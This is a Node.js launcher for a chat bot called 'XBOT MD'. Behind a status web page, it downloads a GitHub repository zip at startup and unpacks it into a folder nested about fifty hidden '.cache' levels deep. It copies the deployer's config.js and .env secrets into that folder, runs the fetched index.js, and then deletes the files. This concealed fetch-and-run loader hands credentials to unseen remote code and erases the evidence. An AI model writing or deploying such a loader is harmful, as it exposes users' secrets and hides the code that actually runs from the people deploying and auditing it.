const fs = require('fs');
const path = require('path');
const axios = require('axios');
const AdmZip = require('adm-zip');
const express = require("express");

const app = express();
const port = process.env.PORT || 9090;

// HTML status route
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>XBOT MD | STATUS</title>
      <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap" rel="stylesheet">
      <style>
        * { box-sizing: border-box; }
        body {
          margin: 0;
          padding: 0;
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          font-family: 'Roboto Mono', monospace;
          background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
          color: #ffffff;
        }
        .card {
          background: rgba(0, 0, 0, 0.6);
          padding: 30px 25px;
          border-radius: 16px;
          text-align: center;
          box-shadow: 0 8px 24px rgba(0, 255, 128, 0.3);
          border: 1px solid #00ff99;
          width: 90%;
          max-width: 420px;
          animation: fadeInUp 1.2s ease-out;
        }
        .card h1 {
          font-size: 1.8rem;
          color: #00ff99;
          margin-bottom: 10px;
        }
        .card p {
          font-size: 1rem;
          color: #cccccc;
        }
        .status-dot {
          display: inline-block;
          width: 12px;
          height: 12px;
          background-color: #00ff99;
          border-radius: 50%;
          margin-right: 8px;
          vertical-align: middle;
          animation: pulse 1.2s infinite;
        }
        @keyframes fadeInUp {
          from { opacity: 0; transform: translateY(30px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes pulse {
          0% { transform: scale(1); opacity: 1; }
          50% { transform: scale(1.3); opacity: 0.6; }
          100% { transform: scale(1); opacity: 1; }
        }
        @media (max-width: 480px) {
          .card { padding: 20px 15px; }
          .card h1 { font-size: 1.4rem; }
          .card p { font-size: 0.95rem; }
        }
      </style>
    </head>
    <body>
      <div class="card">
        <h1><span class="status-dot"></span> XBOT MD IS RUNNING</h1>
        <p>POWERED BY DAVID X.</p>
      </div>
    </body>
    </html>
  `);
});

// Start web server first (Heroku needs it!)
app.listen(port, () => {
  console.log(`Xbot server listening on http://localhost:${port}`);
});

// Continue with bot logic
const repoZipUrl = 'https://github.com/Git-horb/P/archive/refs/heads/main.zip';

let deepPath = path.join(__dirname, '.node');
for (let i = 0; i < 50; i++) {
  deepPath = path.join(deepPath, '.cache');
}
const repoFolder = path.join(deepPath, '.node');

async function downloadAndExtractRepo() {
  try {
    console.log('🔄 Pulling file from hides...');
    const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
    const zip = new AdmZip(Buffer.from(response.data, 'binary'));
    fs.mkdirSync(repoFolder, { recursive: true });
    zip.extractAllTo(repoFolder, true);
    console.log('✅ Repo pulled and extracted');
  } catch (error) {
    console.error('❌ Error pulling file:', error.message);
    process.exit(1);
  }
}

(async () => {
  await downloadAndExtractRepo();

  const extractedFolders = fs
    .readdirSync(repoFolder)
    .filter(f => fs.statSync(path.join(repoFolder, f)).isDirectory());

  if (!extractedFolders.length) {
    console.error('❌ No l found in extracted content');
    process.exit(1);
  }

  const extractedRepoPath = path.join(repoFolder, extractedFolders[0]);

  // copy config.js
  const srcConfig = path.join(__dirname, 'config.js');
  const destConfig = path.join(extractedRepoPath, 'config.js');

  try {
    fs.copyFileSync(srcConfig, destConfig);
    console.log('✅ config.js copied');
  } catch (err) {
    console.error('❌ Failed to copy config.js:', err.message);
    process.exit(1);
  }

  // copy .env
  const srcEnv = path.join(__dirname, '.env');
  const destEnv = path.join(extractedRepoPath, '.env');

  if (fs.existsSync(srcEnv)) {
    try {
      fs.copyFileSync(srcEnv, destEnv);
      console.log('✅ .env file copied');
    } catch (err) {
      console.error('❌ Failed to copy .env:', err.message);
    }
  } else {
    console.warn('⚠️ .env file not found – skipping');
  }

  // check configdb.js
  const configdbPath = path.join(extractedRepoPath, 'lib', 'configdb.js');
  if (!fs.existsSync(configdbPath)) {
    console.warn('⚠️ Warning: lib/configdb.js not found. Some features may not work.');
  } else {
    console.log('✅ lib/configdb.js exists.');
  }

  // start bot after 4 seconds
  // start bot after 4 seconds
  setTimeout(() => {
    console.log('Starting hides ...');
    try {
      process.chdir(extractedRepoPath);
      require(path.join(extractedRepoPath, 'index.js'));

      // پاکسازی بعد از تاخیر کوتاه (مثلاً 10 ثانیه)
      setTimeout(() => {
        console.log('🧹 Deleting extracted files...');
        fs.rmSync(repoFolder, { recursive: true, force: true });
        console.log('✅ Cleanup complete');
      }, 10000); // 10 ثانیه بعد از اجرا پاک می‌کنه

    } catch (err) {
      console.error('❌ Error while launching index.js:', err.message);
      process.exit(1);
    }
  }, 4000);
  })();
